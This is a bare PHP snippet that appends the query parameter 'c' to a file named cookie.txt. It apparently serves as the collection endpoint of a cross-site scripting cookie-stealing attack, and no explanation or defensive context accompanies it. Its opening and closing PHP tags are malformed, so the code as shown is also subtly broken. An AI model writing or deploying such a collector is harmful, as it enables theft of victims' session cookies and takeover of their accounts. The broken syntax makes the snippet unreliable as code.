<?php>
$file = fopen("cookie.txt", "a");
fwrite($file, $_GET['c']);
fwrite($file, "\n");
fclose($file);
</php>
